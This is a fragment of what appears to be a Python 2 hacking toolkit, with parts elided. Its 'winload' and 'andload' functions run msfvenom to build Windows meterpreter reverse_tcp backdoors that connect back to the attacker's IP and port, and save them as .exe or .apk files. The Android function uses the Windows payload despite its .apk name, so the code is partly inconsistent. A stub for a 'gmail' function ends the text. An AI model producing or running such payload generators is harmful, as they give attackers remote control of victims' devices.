...
#i do not give you permission to show this script without my credit
import platform
import webbrowser
import hashlib
import subprocess
...
def winload():
	...
	ak = 'msfvenom -p windows/meterpreter/reverse_tcp LPORT={0} R> /root/Desktop/{1}.exe LHOST={2}'.format(pf,na,ipaddr)
	os.system(ak)
	print Y+"! payload saved to /root/Desktop/ !\033[0m"
def andload():
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	...
	pf = raw_input("Port: ")
	na = raw_input("Name of File: ")
	ak = 'msfvenom -p windows/meterpreter/reverse_tcp LPORT={0} R> /root/Desktop/{1}.apk LHOST={2}'.format(pf,na,ipaddr)
	os.system(ak)
	print Y+"! payload saved to /root/Desktop/ !\033[0m"
def gmail():
  #!/usr/bin/python
